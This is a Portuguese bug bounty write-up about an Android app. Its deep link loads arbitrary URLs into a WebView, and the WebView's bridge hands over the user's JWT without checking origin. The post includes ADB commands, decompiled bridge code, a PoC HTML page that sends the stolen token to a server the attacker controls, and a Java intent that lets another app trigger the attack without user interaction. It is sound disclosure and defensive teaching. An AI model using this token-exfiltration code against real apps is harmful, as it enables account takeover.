@@ -1,0 +1,189 @@
+---
+title: "Account Takeover em App Mobile: como um deep link virou um grande vetor de ataque"
+seoTitle: "Account Takeover em App Mobile via Deep Link"
+date: "2026-03"
+description: "Um deep link que aceitava qualquer URL abria minha página numa WebView, e a bridge nativa entregava o JWT do usuário sem checar a origem. O caminho da engenharia reversa até o PoC, o relatório no bug bounty e o que corrigir."
+slug: "account-takeover-in-mobile-apps-how-a-deep-link-became-a-major-attack-vector"
+originalUrl: "https://www.linkedin.com/pulse/account-takeover-em-app-mobile-como-um-deep-link-virou-tiago-danin-syhof/"
+lang: "pt"
+cover: "/images/posts/account-takeover-em-app-mobile-como-um-deep-link-virou-um-grande-vetor-de-ataque/cover.png"
+tags: ["Security", "Mobile", "Android", "Article"]
+---
+
+![Account Takeover em App Mobile: como um deep link virou um grande vetor de ataque](/images/posts/account-takeover-em-app-mobile-como-um-deep-link-virou-um-grande-vetor-de-ataque/cover.png)
+
+Eu sou do tipo curioso. Quando uso um app com frequência começa aquela coceira: como isso funciona por dentro? Quem tomou as decisões de arquitetura? Tem algo interessante pra achar? Foi exatamente isso que aconteceu com um app que uso no meu dia a dia. Decidi testar, sem compromisso formal, só pela curiosidade de entender o funcionamento.
+
+O que eu não esperava era encerrar a sessão com um PoC de account takeover funcionando.
+
+## Entendendo a stack
+
+A primeira coisa que me chamou atenção foi a stack. O app usava Flutter, mas algumas telas pareciam muito uma tela web. Aquela sensação de "isso aqui não é Flutter puro". Alguns componentes tinham comportamento diferente, scroll diferente, fonte diferente. Resolvi entender como a parte nativa se conectava com a parte web da aplicação.
+
+Foi aí que eu comecei a explorar com mais atenção.
+
+## Mapeando os deep links
+
+Com esse contexto em mente, fui olhar o que o app expunha de forma estática: strings, classes, deep links. Deep links são a interface pública do app, a forma como ele aceita input de fora do ambiente controlado. E esse app tinha muitos.
+
+Fui mapeando um a um, montando payloads para cada esquema, procurando algum que abrisse uma WebView com conteúdo que eu pudesse controlar. A ideia básica: se um deep link redireciona para uma WebView e essa WebView carrega uma URL arbitrária, eu tenho uma superfície de ataque interessante.
+
+Aí encontrei algo que não fazia sentido. Havia um deep link que abria uma página de suporte, uma URL externa hospedada fora do app. Só que, ao invés de o app ir direto para essa URL, ele passava por um deep link como intermediário, com o endereço da página como parâmetro URL:
+
+```
+app_name_schm://open/user/invite_program?url=https://pagina-externa.com/
+```
+
+Por que dar essa volta? Abrir um deep link dentro do app pra depois chegar numa URL externa? Quando algo não faz sentido, eu testo.
+
+O comportamento que eu imaginei como esperado:
+
+![Fluxo esperado: o usuário clica no link, o browser abre a URL diretamente e chega na página de suporte](/images/posts/account-takeover-em-app-mobile-como-um-deep-link-virou-um-grande-vetor-de-ataque/flow-expected.png)
+
+Mas o que o app realmente fazia era isso:
+
+![Fluxo real: o link dispara o deep link, o app passa o parâmetro url= para a WebView, que carrega a página de suporte](/images/posts/account-takeover-em-app-mobile-como-um-deep-link-virou-um-grande-vetor-de-ataque/flow-actual.png)
+
+Essa volta extra significava que quem controlasse o parâmetro URL controlava o que a WebView carregava.
+
+## O teste óbvio
+
+Substituí a URL da página de suporte pelo endereço do Google e simulei a abertura do link via ADB:
+
+```bash
+adb shell am start -d "app_name_schm://open/user/invite_program?url=https://google.com"
+```
+
+O Google carregou. Dentro do app. Numa WebView, com toda a aparência do aplicativo ao redor.
+
+Tecnicamente eu tinha um open redirect que poderia ser usado para UI Spoofing. Mas isso sozinho não me animava. Eu queria saber o que mais essa WebView carregava. Uma WebView dentro de um app não é um navegador normal: ela pode ter bridges JavaScript que conectam a página ao código nativo do app. Se eu controlava o que carregava ali, precisava saber o que tinha nesse contexto.
+
+Para inspecionar o ambiente, carreguei o meu próprio WebView Inspector dentro da WebView do app:
+
+```bash
+adb shell am start -d "app_name_schm://open/user/invite_program?url=https://tiagodanin.com/webview"
+```
+
+O inspector carregou dentro do app e confirmou execução de JavaScript naquele contexto. Além disso, consegui ver quais objetos e funções estavam disponíveis na `window`, o que me deu a visão que eu precisava pra entender o que a bridge tinha.
+
+## O que a WebView sabia fazer
+
+Com execução JavaScript confirmada, parti pra engenharia reversa da bridge. Descompilei o app com jadx e procurei pelos padrões `evaluateJavascript`, `callWebView` e `postMessage`, métodos típicos de comunicação entre WebView e código nativo no Android.
+
+Encontrei a classe `WebViewJavaScriptApi` e o delegate `userWebViewJsDelegate`. O app injetava funções diretamente na WebView usando `evaluateJavascript`. Um dos métodos chamou atenção imediata:
+
+```java
+String str2 = String.format(
+    "callWebView({action: 'refresh_jwt', success: %s, payload: {data: '%s'}})",
+    Boolean.valueOf(z11), str
+);
+this.webView.evaluateJavascript(str2, null);
+```
+
+O app tinha uma action chamada `refresh_jwt` que, quando chamada, injetava um JWT na página via `callWebView`. E no bundle JS, encontrei como o lado web recebia essa resposta:
+
+```javascript
+window.callWebView = e => {
+    let n = new CustomEvent(e.action, { detail: e });
+    document.dispatchEvent(n);
+}
+```
+
+O ciclo ficou claro: a página chama `window.Android.postMessage` com a action `refresh_jwt`, o app nativo processa, responde chamando `window.callWebView` com o token, e a página escuta o CustomEvent com o JWT dentro.
+
+A questão era: isso validava a origem da requisição? Quais os parâmetros obrigatórios no payload?
+
+### Chamando o desconhecido
+
+Não tinha documentação, e também não tinha código de frontend usando isso de forma clara. Mas tinha uma hipótese simples: e se eu chamar `refresh_jwt` com payload vazio? Será que ele retornaria um erro com o nome dos campos que estão faltando?
+
+```javascript
+window.Android?.postMessage(JSON.stringify({
+    action: "refresh_jwt",
+    data: {}
+}));
+```
+
+Tive uma surpresa: mesmo enviando um payload vazio, recebi uma resposta com um JWT válido.
+
+![Página do PoC dentro do app, com o payload bruto recebido e o token extraído](/images/posts/account-takeover-em-app-mobile-como-um-deep-link-virou-um-grande-vetor-de-ataque/app-open-page.png)
+
+Esse foi o momento de parar e entender o tamanho do problema. Qualquer página carregada nessa WebView podia pedir o token de autenticação do usuário e receber, sem nenhuma verificação de origem. O app não validava de onde vinha o `postMessage`. Ele simplesmente retornava o token.
+
+## Fechando o ataque
+
+Com o fluxo mapeado, a exploração era direta. Criei uma página HTML que, ao carregar, disparava `refresh_jwt` automaticamente, escutava o retorno e enviaria o JWT para um servidor controlado:
+
+```html
+<script>
+    window.callWebView = (data) => {
+        const event = new CustomEvent("callwebview", {
+            detail: data
+        });
+        window.dispatchEvent(event);
+    };
+
+    window.addEventListener("callwebview", async function (e) {
+        const token = e?.detail?.payload?.data;
+        if (token) {
+            await fetch("/dataSend=" + encodeURIComponent(token));
+        }
+    });
+
+    window.Android?.postMessage(JSON.stringify({
+        action: "refresh_jwt",
+        data: {}
+    }));
+</script>
+```
+
+O vetor de entrega era o próprio deep link do app, com a URL da minha página no parâmetro:
+
+```
+app_name_schm://open/user/invite_program?url=https://meu-servidor.com/poc.html
+```
+
+![Log do servidor recebendo a requisição com o token](/images/posts/account-takeover-em-app-mobile-como-um-deep-link-virou-um-grande-vetor-de-ataque/server-fake-xss-response.png)
+
+![Token extraído usado numa requisição à API do app](/images/posts/account-takeover-em-app-mobile-como-um-deep-link-virou-um-grande-vetor-de-ataque/test-token.png)
+
+O fluxo completo do ataque ficou assim:
+
+![Diagrama de sequência: o atacante envia o deep link, a vítima abre, a WebView carrega a página do atacante, o JWT é devolvido via callWebView e exfiltrado por fetch](/images/posts/account-takeover-em-app-mobile-como-um-deep-link-virou-um-grande-vetor-de-ataque/attack-sequence.png)
+
+## Você nem precisa clicar
+
+O link parece legítimo. Começa com o esquema do app, tem a estrutura do deep link real, pode ser enviado via WhatsApp, Telegram ou QR code. Mas tem um detalhe importante que vai além do phishing tradicional: **você não precisa necessariamente clicar em nada**.
+
+Um app malicioso instalado no mesmo dispositivo pode disparar esse deep link programaticamente, sem nenhuma interação do usuário:
+
+```java
+Intent intent = new Intent();
+intent.setAction(Intent.ACTION_VIEW);
+intent.setData(Uri.parse("app_name_schm://open/user/invite_program?url=https://meu-servidor.com/poc.html"));
+startActivity(intent);
+```
+
+Basta o app malicioso estar instalado e rodar em segundo plano. O usuário abre o app legítimo normalmente, mas a conta já foi comprometida antes disso. Um app aparentemente inofensivo pode ser o vetor de entrega.
+
+## O relatório e o resultado
+
+Gravei um vídeo mostrando o fluxo completo, desde o link sendo aberto até o token chegando no servidor, e submeti o relatório numa sexta à noite para a empresa, sabendo que era fim de semana.
+
+Dois dias depois, confirmaram a reprodução. Dois dias depois disso, a recompensa foi paga. No final do mesmo mês, o patch saiu e a vulnerabilidade foi corrigida em toda a base de usuários.
+
+Quero agradecer à empresa pela receptividade, pela agilidade na correção e pela recompensa justa, esse tipo de resposta faz muita diferença pra os bug bounty.
+
+## O que fica
+
+Esse tipo de vulnerabilidade é mais sutil do que parece. A bridge webview &lt;-&gt; nativo em si faz sentido, o app precisa atualizar o token da sessão para as páginas web que carrega. O problema está na interseção de duas decisões separadas: a bridge que confia em qualquer página carregada, e o deep link que aceita qualquer URL. Individualmente, cada uma pode parecer razoável, mas juntas, criam uma superfície de ataque de alto risco.
+
+Para quem desenvolve apps mobile: WebViews que aceitam URLs externas não podem ter bridges com dados sensíveis. Ou você valida a origem rigorosamente, ou você não expõe o token dessa forma. As duas coisas juntas criam exatamente esse cenário.
+
+E aprendemos uma lição importante: mesmo que um link venha de uma fonte que parece confiável e tenha a cara de um link legítimo do app, o deep link pode estar comprometido. Ou ter um app mal-intencionado no seu celular, o canal nem precisa passar por você ele mesmo pode acionar o link. Então tome cuidado com que é acessado no celular.
+
+---
+
+> **Aviso de divulgação:** Alguns dados técnicos neste post foram modificados ou omitidos em conformidade com as [diretrizes de divulgação responsável do HackerOne](https://www.hackerone.com/terms/disclosure-guidelines) e com as regras do programa de bug bounty da empresa afetada. A vulnerabilidade foi corrigida antes da publicação deste artigo (muito tempo já).
+
+Este conteúdo possui caráter exclusivamente técnico e educacional, com o objetivo de discutir arquitetura, vetores de ataque e boas práticas de segurança. Nenhuma atividade ilegal é incentivada ou encorajada; a intenção é contribuir para que desenvolvedores e empresas compreendam melhor esses riscos e possam fortalecer a segurança de seus sistemas.
